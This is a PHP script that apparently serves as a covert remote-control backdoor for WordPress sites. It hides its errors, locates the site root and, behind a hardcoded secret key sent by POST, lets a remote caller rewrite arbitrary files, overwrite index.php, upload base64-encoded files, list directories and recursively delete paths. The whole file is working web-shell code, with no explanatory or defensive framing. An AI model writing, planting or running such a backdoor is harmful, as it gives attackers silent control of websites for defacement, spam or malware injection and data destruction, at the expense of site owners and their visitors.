<?php
define('SECRET_KEY', 'Gfkdfgiorodflllvfgjririfkglfkglrkllkf'); 
error_reporting(0);
ini_set('display_errors', 0);
ob_start();
function send_response($data) { ob_end_clean(); header('Content-Type: application/json'); echo json_encode($data); exit; }
function find_wp_root_path() { $current_dir = __DIR__; while (is_dir($current_dir) && $current_dir !== '/' && strlen($current_dir) > 1) { if (is_dir($current_dir . '/wp-admin') && file_exists($current_dir . '/wp-includes/version.php')) { return $current_dir; } $parent_dir = dirname($current_dir); if ($parent_dir === $current_dir) { return false; } $current_dir = $parent_dir; } return false; }
function get_operation_root() { $wp_root = find_wp_root_path(); if ($wp_root === false) { return false; } $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : null; $wp_root_real = realpath($wp_root); if ($doc_root && ($wp_root_real !== $doc_root)) { $parent_dir = dirname($wp_root_real); if (realpath($parent_dir) === $doc_root) { return $parent_dir; } } return $wp_root; }
function rrmdir($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "." && $object != "..") { $path = $dir . DIRECTORY_SEPARATOR . $object; is_dir($path) && !is_link($path) ? rrmdir($path) : unlink($path); } } rmdir($dir); } }
if (!isset($_POST['secret_key']) || $_POST['secret_key'] !== SECRET_KEY) { send_response(['status' => 'error', 'message' => 'Authentication failed.']); }
$base_dir = get_operation_root(); 
if ($base_dir === false) { send_response(['status' => 'error', 'message' => 'Could not determine root directory.']); }
if (!isset($_POST['action'])) { send_response(['status' => 'error', 'message' => 'Action not specified.']); }
$action = trim($_POST['action']);

switch ($action) {
    case 'ping':
    case 'check-health':
        send_response(['status' => 'success', 'message' => 'pong (' . $base_dir . ')']);
        break;

    case 'find_replace':
        if (isset($_POST['path_and_filename'], $_POST['find_text'], $_POST['replace_text'])) {
            $file_path_relative = trim($_POST['path_and_filename'], '/\\');
            $file_path_absolute = realpath($base_dir . '/' . $file_path_relative);

            if (!$file_path_absolute || strpos($file_path_absolute, $base_dir) !== 0) {
                send_response(['status' => 'error', 'message' => 'Forbidden path: ' . htmlspecialchars($file_path_relative)]);
            }
            if (!file_exists($file_path_absolute)) {
                send_response(['status' => 'error', 'message' => 'File not found.']);
            }
            if (!is_readable($file_path_absolute)) {
                 send_response(['status' => 'error', 'message' => 'Cannot read file (check permissions).']);
            }
            
            $content = file_get_contents($file_path_absolute);
            $find_text = $_POST['find_text'];

            if (strpos($content, $find_text) === false) {
                send_response(['status' => 'info', 'message' => 'Skipped: Text not found in file.']);
            }

            if (!is_writable($file_path_absolute)) {
                send_response(['status' => 'error', 'message' => 'Cannot write to file (check permissions).']);
            }

            $new_content = str_replace($find_text, $_POST['replace_text'], $content);
            
            if (file_put_contents($file_path_absolute, $new_content) !== false) {
                send_response(['status' => 'success', 'message' => 'Success: Text has been replaced.']);
            } else {
                send_response(['status' => 'error', 'message' => 'Error: Failed to write new content to file.']);
            }
        } else {
            send_response(['status' => 'error', 'message' => 'Missing parameters for find-replace an action.']);
        }
        break;

    case 'create_file':
        if (isset($_POST['filename'], $_POST['content'])) { $filename = basename(trim($_POST['filename'])); $content = $_POST['content']; $filePath = $base_dir . '/' . $filename; if (in_array(strtolower($filename), ['index.php', 'wp-config.php', '.htaccess', 'wp-settings.php', 'wp-load.php'])) { send_response(['status' => 'error', 'message' => 'Rewriting ' . htmlspecialchars($filename) . ' is forbidden for security reasons.']); } if (file_put_contents($filePath, $content) !== false) { send_response(['status' => 'success', 'message' => 'File created successfully: ' . htmlspecialchars($filename)]); } else { send_response(['status' => 'error', 'message' => 'Failed to create file. Check permissions for ' . htmlspecialchars($base_dir)]); } } else { send_response(['status' => 'error', 'message' => 'Filename or content not provided.']); }
        break;

    case 'list-files':
        if (isset($_POST['path'])) { $scan_path = $base_dir . '/' . trim($_POST['path'], '/\\'); if (is_dir($scan_path)) { $files = array_values(array_diff(scandir($scan_path), ['.', '..'])); send_response(['status' => 'success', 'files' => $files]); } else { send_response(['status' => 'error', 'message' => 'Directory not found: ' . htmlspecialchars($_POST['path'])]); } } else { send_response(['status' => 'error', 'message' => 'Path for file listing not provided.']); }
        break;

    case 'replace-index':
        if (isset($_POST['content'])) { $indexPath = $base_dir . '/index.php'; if (is_writable(dirname($indexPath))) { if (file_put_contents($indexPath, $_POST['content']) !== false) { send_response(['status' => 'success', 'message' => 'index.php has been replaced successfully.']); } else { send_response(['status' => 'error', 'message' => 'Failed to write to index.php. Check permissions.']); } } else { send_response(['status' => 'error', 'message' => 'Directory ' . htmlspecialchars(dirname($indexPath)) . ' is not writable.']); } } else { send_response(['status' => 'error', 'message' => 'Content for index.php not provided.']); }
        break;

    case 'create-dir':
        if (isset($_POST['path'])) { $path = $base_dir . '/' . trim($_POST['path'], '/\\'); if (!file_exists($path)) { if (mkdir($path, 0755, true)) { send_response(['status' => 'success', 'message' => 'Directory created: ' . htmlspecialchars($_POST['path'])]); } else { send_response(['status' => 'error', 'message' => 'Failed to create directory. Check permissions.']); } } else { send_response(['status' => 'success', 'message' => 'Directory already exists.']); } } else { send_response(['status' => 'error', 'message' => 'Path for directory not provided.']); }
        break;

    case 'upload_file':
        if (isset($_POST['path'], $_POST['filename'], $_POST['content'])) { $dirPath = $base_dir . '/' . trim($_POST['path'], '/\\'); $filePath = $dirPath . '/' . basename($_POST['filename']); if (!file_exists($dirPath)) mkdir($dirPath, 0755, true); $fileContent = base64_decode($_POST['content'], true); if ($fileContent === false) { send_response(['status' => 'error', 'message' => 'Invalid base64 content.']); } if (file_put_contents($filePath, $fileContent) !== false) { send_response(['status' => 'success', 'message' => 'File uploaded: ' . htmlspecialchars($_POST['path'] . '/' . $_POST['filename'])]); } else { send_response(['status' => 'error', 'message' => 'Failed to write file. Check permissions.']); } } else { send_response(['status' => 'error', 'message' => 'Missing parameters for file upload.']); }
        break;

    case 'delete-path':
        if (isset($_POST['path'])) { $path_to_delete = realpath($base_dir . '/' . trim($_POST['path'], '/\\')); if (!$path_to_delete || strpos($path_to_delete, $base_dir) !== 0 || $path_to_delete === $base_dir) { send_response(['status' => 'error', 'message' => 'Deletion of this path is forbidden for security reasons.']); } if (!file_exists($path_to_delete)) { send_response(['status' => 'success', 'message' => 'Path does not exist, nothing to delete.']); } else { is_dir($path_to_delete) ? rrmdir($path_to_delete) : unlink($path_to_delete); send_response(['status' => 'success', 'message' => 'Path deleted: ' . htmlspecialchars($_POST['path'])]); } } else { send_response(['status' => 'error', 'message' => 'Path to delete not provided.']); }
        break;

    default:
        send_response(['status' => 'error', 'message' => 'Unknown action requested: ' . htmlspecialchars($action)]);
        break;
}
?>